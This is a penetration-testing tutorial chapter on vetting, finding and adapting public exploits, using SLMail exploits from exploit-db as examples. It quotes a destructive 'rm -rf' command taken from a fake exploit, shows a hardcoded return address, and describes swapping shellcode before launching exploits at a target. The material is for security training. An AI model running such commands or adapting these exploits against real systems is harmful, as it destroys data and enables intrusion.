# 9. - Woking with Exploits

Now that we unsderstand the mechanims behind the buffer overflow class of vulnerabilities, we can proceed to inspect and use other people's exploits. There is an import problem with this. Quit often, malicious hackers release fake exploits into the wild, with the purpose of compromising, or otherwise harming, anyone runnig this code.

The exploit code prompts the user to run it as **root**, which is already suspicious:

```c
if (getuid()) {
    puts("Root is required for raw sockets, etc.");
    return 1;
}
```

Further examination of the shellcode payload shows that the actual payload will execute some evil commands, such as:

```bash
rm -rf ~ /* 2> /dev/null &
```

Which would effectively wipe out your Kali machine. The shellcode then proceeds to connect to a public IRC server and announce your idiocy. So if the Internet is riddled with harmful exploits, where can we find reliable ones?

## 9.1 - Searching for Exploits

There are several reliable sources for public exploit code, such as the **[Exploit-Database](https://www.exploit-db.com/)** and **[SecurityFocus](https://www.securityfocus.com/)** vulnerability archives. The exploits on these sites usually undergo close examination, and are not published if deemed fake.

### 9.1.1 - Finding Exploits in Kali Linux

The Exploit Database is maintained by Offensive Security, and provides an offline copy of all the archived exploits it contains. This archive is present in Kali Linux, and has some useful search features. In the following example, exploits with a matching "slmail" string description are found:

```
root@kali:~# searchsploit slmail
--------------------------------------- ----------------------------------------
 Exploit Title                         |  Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------------
SLmail Pro 6.3.1.0 - Multiple Remote D | exploits/windows/dos/31563.txt
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/16399.rb
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/638.py
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/643.c
Seattle Lab Mail (SLmail) 5.5 - POP3 ' | exploits/windows/remote/646.c
--------------------------------------- ----------------------------------------
Shellcodes: No Result
```

### 9.1.2 - Finding Exploits on the Web

The Exploit Database and SecurityFocus exploit archives are both trustworthy sources of exploits, which get updated on a daily basis. In addition, the Exploit Database occasionally matches exploits to vulnerable installations of software, for research purposes.

![exploit-database](https://image.ibb.co/mULxUx/image.png)

SecurityFocus exploit archives will often contain exploit code:

![securityfocus](https://preview.ibb.co/n9wMpx/image.png)

#### 9.1.2.1 - Exercises

1. Identify products that have  a history of problems. Identify products that are typically hard to path.

> ...

2. Look at the frequency of what sort of exploits are released. Can you identify which types of exploits are more common than others?

> ...

3. Understand the different between a reported vulnerability and an exploit.

> ...

## 9.2 - Customizing and Fixing Exploits

Due to varying development enviroments, vulnerable software versions, and different software patches, it is understandable that many (if not most) of the public exploits found on the Internet will not work, straight out of the box. We'll' find everything from wrong offsets, return addressess intended for different operating systems or path levels, and bad code.
Adding to this mess, many exploits might be one shots, meaning that if the exploit is unsuccessful, the service will crash, and will not be available for further exploitation attempts until it is restarted, or until the machine is rebooted.

### 9.2.1 - Setting Up a Development Environment

For the reasons above, we will never run an exploit without first examining its code, and understanding its inner workings. Once we have done that, we will set up a small development environment which matches the operating system version and vulnerable software version, in order to test and improve existing exploits. Once we are fairly certain that our fixed exploit will work on the target machine, we can then proceed to launch it against our victim.

### 9.2.2 - Dealing with Various Exploit Code Languages

Exploit code can come in all forms. From Python, Perl and Ruby scripts, to C or C++. To further complicate things, languages such as C and C++ have different flavors between Linux/Unix and Windows, and this code is often not cross-compatible.

For example, in our previous search for additional SLMail exploits, in the **exploitdb** archive, we found several results. Let's take a closer look at two of them: **643.c** and **646.c**.

#### 9.2.2.1 - Swapping out Shellcode
Most commonly, public exploits will have shellcode that will not suit our purposes.

From shellcodes that pop up a calculator, to bind shells that might not suit out exploitation environment, to reverse shells with hardcoded IPs.

If the program is easily debuggable, such as SLMail, or if the vulnerability is not sensitive to varying buffer sizes, then swapping out the shellcode for the exploit is a relatively simples task. However, for more complex exploits, such as those that bypass DEP and ASLR, swapping out your shellcode might have negative effects on the exploit, due to changes in shellcode size, and resulting misalignment of various instructions in the exploit.

#### 9.2.2.2 - exploitdb - 643.c

The first exploit we look at has the following C directives:

```
root@kali:~# locate 643.c
			...
/usr/share/exploitdb/exploits/windows/remote/643.c
			...
```

```c
root@kali:~# head /usr/share/exploitdb/exploits/windows/remote/643.c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
```

These suggest that this exploit should be compiled in a Unix like environment, with a compiler such as **gcc**.

We peek at the exploit code, and notice several issues with the exploit that will prevent it working as it is. For one, the return address is not relevant to our target machine.

```c
define retadd "\x9f\x45\x3a\x77" /*win2k server sp4 0x773a459f*/
```